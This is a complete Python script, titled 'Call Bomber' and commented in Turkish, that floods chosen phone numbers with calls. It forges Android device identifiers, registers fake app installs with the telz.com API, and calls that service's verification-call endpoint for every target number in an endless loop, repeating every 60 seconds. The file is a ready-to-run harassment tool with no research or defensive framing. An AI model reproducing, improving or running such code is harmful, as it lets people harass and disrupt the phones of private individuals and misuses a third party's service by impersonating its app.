import time, random, string, uuid, json, requests
class CihazBilgisi:
    @staticmethod
    def uret():
        zaman_damgasi = round(time.time() * 1000)
        cihaz_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
        cihaz_uuid = str(uuid.uuid4())
        return zaman_damgasi, cihaz_id, cihaz_uuid

class ApiIstemi:
    def __init__(self, temel_basliklar):
        self.basliklar = temel_basliklar

    def gonder(self, adres, veri):
        try:
            yanit = requests.post(adres, data=veri, headers=self.basliklar)
            return (yanit.ok and "ok" in yanit.text, yanit.text)
        except Exception as e:
            return (False, str(e))

class UygulamaKurucu:
    def __init__(self, telefon_numarasi, basliklar):
        self.telefon_numarasi = telefon_numarasi
        self.api_istemci = ApiIstemi(basliklar)
        self.kurulum_api = "https://api.telz.com/app/install"
        self.dogrulama_api = "https://api.telz.com/app/auth_call"

    def kur(self, tekrar_sayisi=2):
        ts, android_id, uid = CihazBilgisi.uret()
        kurulum_verisi = json.dumps({
            "android_id": android_id,
            "app_version": "17.5.17",
            "event": "install",
            "google_exists": "yes",
            "os": "android",
            "os_version": "9",
            "play_market": True,
            "ts": ts,
            "uuid": uid
        })
        for _ in range(tekrar_sayisi):
            basarili, _ = self.api_istemci.gonder(self.kurulum_api, kurulum_verisi)
            if basarili:
                self.dogrula(ts, android_id, uid)

    def dogrula(self, ts, android_id, uid):
        dogrulama_verisi = json.dumps({
            "android_id": android_id,
            "app_version": "17.5.17",
            "attempt": "0",
            "event": "auth_call",
            "lang": "ar",
            "os": "android",
            "os_version": "9",
            "phone": f"+{self.telefon_numarasi}",
            "ts": ts,
            "uuid": uid
        })
        basarili, yanit = self.api_istemci.gonder(self.dogrulama_api, dogrulama_verisi)
        if basarili:
            print(f"✅ +{self.telefon_numarasi} için arama başarıyla gönderildi.")
        else:
            print(f"❌ +{self.telefon_numarasi} için arama başarısız: {yanit}")

def batu():
    print("📞 Call Bomber ")
    print ("-" *60)
    bb = input("Lütfen hedef numaraları girin (virgülle ayırarak): ")
    numaralar = [num.strip().replace("+", "") for num in bb.split(",") if num.strip().replace("+", "").isdigit()]

    if not numaralar:
        print("❗ Geçerli numara girilmedi.")
        return

    ua = {
        "User-Agent": "Telz-Android/17.5.17",
        "Content-Type": "application/json"
    }
    try:
        while True:
            for numara in numaralar:
                kurucu = UygulamaKurucu(numara, ua)
                kurucu.kur(tekrar_sayisi=1)
            print("🔄 60 saniye bekleniyor...")
            time.sleep(60)
    except KeyboardInterrupt:
        print("\n⛔ Program durduruldu.")
    except Exception as e:
        print(f"⚠️ Hata oluştu: {str(e)}")
if __name__ == "__main__":
    batu()